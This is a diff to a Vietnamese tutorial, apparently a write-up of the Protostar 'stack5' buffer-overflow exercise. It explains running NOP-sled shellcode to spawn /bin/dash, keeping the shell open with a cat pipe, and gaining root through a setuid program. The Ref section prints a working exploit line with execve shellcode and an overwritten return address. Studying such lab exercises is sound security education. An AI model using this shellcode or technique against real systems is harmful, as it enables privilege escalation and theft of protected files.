@@ -140,6 +140,26 @@ Phân biệt <span style="color:orangered">địa chỉ eip mới</span>, <span 
 <span style="color:springgreen">0xbffff79d</span>:     <span style="color:springgreen">inc    eax</span>
 <span style="color:springgreen">0xbffff79e</span>:     <span style="color:springgreen">int    0x80</span>
 </pre>
+Trước khi chạm tới shellcode được lưu bắt đầu từ `0xbffff784`, 4 lệnh `nop` sẽ được chạy.
+
+Cách exploit stack5 đầy đủ có thể được xem tại cuối bài.
+Lưu ý với những chương trình như /bin/dash, người dùng có thể tiếp tục nhập lệnh vào tương tự như bash hay command prompt.
+Để bạn có thể nhập vào, hãy dùng lệnh cat và pipe std input output sang stack5 như sau.
+```bash
+(cat input.txt ; cat) | stack5
+```
+input.txt được mở bởi cat và chuyển tiếp sang stack5, sau đó cat tiếp tục để mở để nhập thêm lệnh.
+Sau khi chạy shellcode và mở /bin/dash thành công, bạn có thể thử nhập vào các lệnh cơ bản như cd, ls, hay mkdir.
+
+Chạy lệnh sau đây trên bash sẽ cho bạn biết bạn có quyền gì với chương trình đang được chạy.
+```bash
+whoami
+```
+Một số những chương trình, trong đó stack5 là một ví dụ, sẽ được thực thi với quyền root, kể cả người chạy chương trình là user thông thường.
+Quyền root là quyền cao nhất, cho phép bạn xem những file chứa thông tin bảo mật như password.
+Do vậy nếu những chương trình này có lỗ hổng, hacker sẽ chiếm được quyền cao nhất để đánh cắp thông tin hoặc phá hoại.
+Đây chính là hacking.
+
 ## Ref
 ```bash
 user@protostar:~$ python -c "print '\x90' * 36 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x80\xf7\xff\xbf' * 4" > input.txt
